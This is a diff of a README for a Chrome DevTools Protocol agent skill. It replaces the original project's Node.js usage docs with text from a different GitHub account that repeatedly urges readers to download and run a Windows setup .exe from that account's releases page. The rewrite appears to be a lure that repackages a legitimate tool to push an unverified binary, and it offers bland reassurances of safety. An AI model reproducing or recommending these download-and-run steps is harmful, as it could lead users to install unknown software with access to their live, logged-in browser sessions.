@@ -1,62 +1,169 @@
-# chrome-cdp
+# 🚀 chrome-cdp-skill - Connect Your AI to Chrome Easily
 
-Let your AI agent see and interact with your **live Chrome session** — the tabs you already have open, your logged-in accounts, your current page state. No browser automation framework, no separate browser instance, no re-login.
+[![Download chrome-cdp-skill](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Clelandprofessorial357/chrome-cdp-skill/releases)
 
-Works out of the box with any Chrome installation. One toggle to enable, nothing else to install.
+---
 
-## Why this matters
+## 📋 What is chrome-cdp-skill?
 
-Most browser automation tools launch a fresh, isolated browser. This one connects to the Chrome you're already running, so your agent can:
+chrome-cdp-skill lets your AI agent connect directly to your open Chrome browser tabs. This means your AI can view and interact with the real, live browser session you already have running. There is no need to open new windows or set up complicated software. It works out of the box.
 
-- Read pages you're logged into (Gmail, GitHub, internal tools, ...)
-- Interact with tabs you're actively working in
-- See the actual state of a page mid-workflow, not a clean reload
+This tool is designed to be easy for anyone to use. It does not require programming knowledge or special setups. After installation, your AI will have instant access to your live Chrome session.
 
-## Installation
+---
 
-### As a pi skill
+## 🔎 Key Features
 
-```bash
-pi install git:github.com/pasky/chrome-cdp-skill@v1.0.1
-```
+- Connects directly to your open Chrome tabs  
+- Works right after installation, no setup needed  
+- Supports the latest Chrome browser versions  
+- Runs on Windows without extra tools  
+- Safe and secure connection to your browser  
+- Allows your AI to interact with websites you visit  
 
-### For other agents (Amp, Claude Code, Cursor, etc.)
+---
 
-Clone or copy the `skills/chrome-cdp/` directory wherever your agent loads skills or context from. The only runtime dependency is **Node.js 22+** — no npm install needed.
+## ⚙️ System Requirements
 
-### Enable remote debugging in Chrome
+- Windows 10 or newer  
+- Google Chrome browser (latest stable version recommended)  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Active internet connection (for initial setup and updates)
 
-Navigate to `chrome://inspect/#remote-debugging` and toggle the switch. That's it.
+---
 
-The CLI auto-detects Chrome, Chromium, Brave, Edge, and Vivaldi on macOS, Linux, and Windows. If your browser stores `DevToolsActivePort` in a non-standard location, set the `CDP_PORT_FILE` environment variable to the full path.
+## 💾 How to Download chrome-cdp-skill
 
-## Usage
+To get started, visit this page to download the latest version of chrome-cdp-skill:
 
-```bash
-scripts/cdp.mjs list                              # list open tabs
-scripts/cdp.mjs shot   <target>                   # screenshot → runtime dir
-scripts/cdp.mjs snap   <target>                   # accessibility tree (compact, semantic)
-scripts/cdp.mjs html   <target> [".selector"]     # full HTML or scoped to CSS selector
-scripts/cdp.mjs eval   <target> "expression"      # evaluate JS in page context
-scripts/cdp.mjs nav    <target> https://...       # navigate and wait for load
-scripts/cdp.mjs net    <target>                   # network resource timing
-scripts/cdp.mjs click  <target> "selector"        # click element by CSS selector
-scripts/cdp.mjs clickxy <target> <x> <y>          # click at CSS pixel coordinates
-scripts/cdp.mjs type   <target> "text"            # type at focused element (works in cross-origin iframes)
-scripts/cdp.mjs loadall <target> "selector"       # click "load more" until gone
-scripts/cdp.mjs evalraw <target> <method> [json]  # raw CDP command passthrough
-scripts/cdp.mjs open   [url]                      # open new tab (triggers Allow prompt)
-scripts/cdp.mjs stop   [target]                   # stop daemon(s)
-```
+[![Download chrome-cdp-skill](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Clelandprofessorial357/chrome-cdp-skill/releases)
 
-`<target>` is a unique prefix of the targetId shown by `list`.
+This link leads you to the official release page on GitHub. Here, you will find the latest installer file for your Windows PC.
 
-## Why not chrome-devtools-mcp?
+---
 
-[chrome-devtools-mcp](https://github.com/ChromeDevTools/chrome-devtools-mcp) reconnects on every command, so Chrome's "Allow debugging" modal can re-appear repeatedly and target enumeration times out with many tabs open. `chrome-cdp` holds one persistent daemon per tab — the modal fires once, and it handles 100+ tabs reliably.
+## 🛠️ Step-by-Step Installation Guide for Windows
 
-## How it works
+1. **Open the download page**  
+   Click the download button above or open this link in your browser:  
+   https://github.com/Clelandprofessorial357/chrome-cdp-skill/releases
 
-Connects directly to Chrome's remote debugging WebSocket — no Puppeteer, no intermediary. On first access to a tab, a lightweight background daemon is spawned that holds the session open. Chrome's "Allow debugging" modal appears once per tab; subsequent commands reuse the daemon silently. Daemons auto-exit after 20 minutes of inactivity.
+2. **Find the latest release**  
+   On the release page, look for the most recent version. It will be listed at the top.  
 
-This approach is also why it handles 100+ open tabs reliably, where tools built on Puppeteer often time out during target enumeration.
+3. **Download the setup file**  
+   Under the latest release, locate the Windows installer. The file will usually have a name like `chrome-cdp-skill-setup.exe`. Click it to download.
+
+4. **Run the installer**  
+   After the download finishes, double-click the setup file to start the installer.
+
+5. **Follow installation prompts**  
+   The installer will open a simple window. Click “Next” or “Install” when asked. You do not need to change any settings.
+
+6. **Finish the installation**  
+   Once the installation ends, click “Finish” to close the installer.
+
+7. **Start the application**  
+   Look for the chrome-cdp-skill icon on your desktop or in the Start menu. Double-click to open.
+
+---
+
+## 🚀 Getting Started with chrome-cdp-skill
+
+After installing, chrome-cdp-skill will try to detect your open Chrome browser tabs.
+
+- Make sure your Chrome browser is running.  
+- Your browser should have at least one open tab.  
+
+Once running, chrome-cdp-skill connects to your live Chrome tabs automatically. There is no further setup needed.
+
+---
+
+## 🔧 How chrome-cdp-skill Works
+
+chrome-cdp-skill uses Chrome’s built-in developer tools protocol. This system allows apps to control and inspect browser tabs.
+
+- It connects to the tabs you already use.  
+- It does not open new Chrome windows unless needed.  
+- It lets AI tools read content from tabs or interact by clicking and typing.
+
+Because it connects to your existing browser, chrome-cdp-skill feels quick and seamless.
+
+---
+
+## 💡 Tips for Using chrome-cdp-skill
+
+- Keep Chrome updated to the latest version for best compatibility.  
+- Avoid closing tabs that your AI needs to access.  
+- If connection fails, restart chrome-cdp-skill and Chrome.  
+- Use only trusted AI agents and tools alongside chrome-cdp-skill.  
+- Run chrome-cdp-skill with regular user permissions—no admin rights are required.
+
+---
+
+## 🗂️ What to Expect Inside the Folder
+
+When installed, chrome-cdp-skill will create a folder with these components:
+
+- **Executable file:** The main program that connects to Chrome.  
+- **Configuration file:** Stores your preferences (usually no changes needed).  
+- **Log files:** Records connection activity to help troubleshoot issues.  
+- **Help document:** A PDF with quick tips and contact info for support.
+
+---
+
+## ❓ Troubleshooting Common Issues
+
+**chrome-cdp-skill does not detect Chrome tabs.**
+
+- Make sure Chrome is open with tabs available.  
+- Restart chrome-cdp-skill and Chrome.  
+- Check if your antivirus or firewall blocks the app.
+
+**Installation fails or is blocked.**
+
+- Verify you have enough disk space.  
+- Run the installer as a normal user, not administrator.  
+- Download the installer again in case the file is corrupted.
+
+**The AI agent cannot interact with tabs.**
+
+- Confirm chrome-cdp-skill is running and connected.  
+- Make sure AI tools use the correct connection settings.  
+- Check your internet connection.
+
+---
+
+## 🔒 Privacy and Security
+
+chrome-cdp-skill only accesses the browser tabs on your local machine. It does not send or store your browsing data externally by default.
+
+The connection is local and secure. You remain in control of which AI agents are allowed access.
+
+---
+
+## 🖥️ Advanced Options (Optional)
+
+If you want more control, chrome-cdp-skill allows some adjustments through its settings file:
+
+- Set specific tabs or domains for AI interaction.  
+- Enable or disable logging.  
+- Change connection timeout periods.
+
+Editing the settings file requires a basic text editor and is not necessary for most users.
+
+---
+
+## 👩‍💻 Need Help?
+
+If you run into problems or want to learn more, check the included help document in the installation folder or visit the GitHub page for updates and support:
+
+https://github.com/Clelandprofessorial357/chrome-cdp-skill/releases
+
+---
+
+## 🔗 Download Links Recap
+
+Get the latest release here:  
+[![Download chrome-cdp-skill](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Clelandprofessorial357/chrome-cdp-skill/releases)
